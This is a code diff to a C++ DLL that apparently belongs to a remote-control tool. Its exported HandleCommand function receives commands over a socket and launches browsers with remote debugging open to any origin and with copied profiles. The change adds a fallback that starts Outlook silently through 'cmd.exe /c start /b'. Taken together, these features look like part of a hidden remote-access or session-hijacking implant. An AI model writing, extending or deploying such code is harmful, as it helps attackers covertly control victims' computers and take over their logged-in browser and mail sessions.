@@ -2391,6 +2391,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     wstring exePath;
+                    wstring customArgs;
                     if (wRequestedPath == L"Outlook") {
                         exePath = get_app_path(L"outlook.exe");
 
@@ -2475,6 +2476,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             if (exePath.empty() || !fs::exists(exePath)) {
                                 wstring searchPfX86 = pfx86 + L"\\Microsoft Office";
                                 exePath = find_outlook_in_dir(searchPfX86);
+                            }
+                        }
+
+                        // 6. Absolute final fallback: Use cmd.exe /c start /b "" "outlook.exe"
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            wchar_t sysRoot[MAX_PATH] = {0};
+                            GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+                            wstring cmdPath = sysRoot[0] ? (wstring(sysRoot) + L"\\System32\\cmd.exe") : L"C:\\Windows\\System32\\cmd.exe";
+                            if (fs::exists(cmdPath)) {
+                                exePath = cmdPath;
+                                customArgs = L" /c start /b \"\" \"outlook.exe\"";
                             }
                         }
                     } else if (wRequestedPath == L"Opera") {
@@ -2666,7 +2678,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 L" --remote-allow-origins=*"
                                 L" --lang=en-US";
                     } else if (wRequestedPath == L"Outlook") {
-                        args = L"";
+                        args = customArgs;
                     } else {
                         args = L" --remote-debugging-port=9222";
                         if (actualCopyProfile) {
